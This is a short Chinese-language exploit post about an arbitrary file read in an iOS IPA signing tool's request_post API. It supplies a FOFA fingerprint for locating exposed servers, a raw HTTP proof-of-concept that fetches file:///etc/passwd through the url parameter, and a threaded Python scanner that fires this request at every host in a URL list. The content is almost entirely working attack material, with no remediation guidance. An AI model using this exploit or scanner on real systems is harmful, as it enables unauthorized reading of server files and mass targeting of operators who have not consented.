# 苹果IOS端IPA签名工具request_post任意文件读取漏洞

该漏洞影响使用了特定API接口且未对输入参数进行有效验证的应用程序。攻击者可以利用此漏洞读取服务器上的任意文件，可能导致敏感信息泄露。

fofa：

```
body="/assets/index/css/mobileSelect.css"
```

poc：

```
GET /api/index/request_post?url=file:///etc/passwd&post_data=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Connection: close
```

批量扫描工具：

```
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
from urllib.parse import urlparse

def is_valid_url(url):
    """检查 URL 是否有效"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def add_protocol(url):
    """为 URL 添加 HTTP 协议头"""
    if not url.startswith('http'):
        return 'http://' + url
    return url

def test_vulnerability(url):
    """测试 URL 是否存在漏洞"""
    full_url = f"{url}/api/index/request_post?url=file:///etc/passwd&post_data=1"
    
    try:
        response = requests.get(full_url, timeout=10)
        if response.status_code == 200:
            print(f"[+] 可能存在的漏洞url: {url}")
        else:
            print(f" Not vulnerable: {url} (Status Code: {response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f" Error testing {url}: {str(e)}")

def main():
    urls = []
    with open("url.txt", "r") as file:
        for line in file:
            url = line.strip()
            if is_valid_url(url):
                urls.append(url)
            else:
                # 尝试修复 URL
                fixed_url = add_protocol(url)
                if is_valid_url(fixed_url):
                    urls.append(fixed_url)
                else:
                    print(f"[-] Invalid URL: {url}")

    # 使用线程池执行任务
    max_workers = 10  # 可以根据系统资源调整线程数量
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(test_vulnerability, url): url for url in urls}
        
        for future in as_completed(futures):
            url = futures[future]
            try:
                data = future.result()
            except Exception as exc:
                print(f" Error occurred while testing {url}: {exc}")

if __name__ == "__main__":
    start_time = time.time()
    main()
    end_time = time.time()
    print(f"\n--- Total time taken: {end_time - start_time:.2f} seconds ---")
```

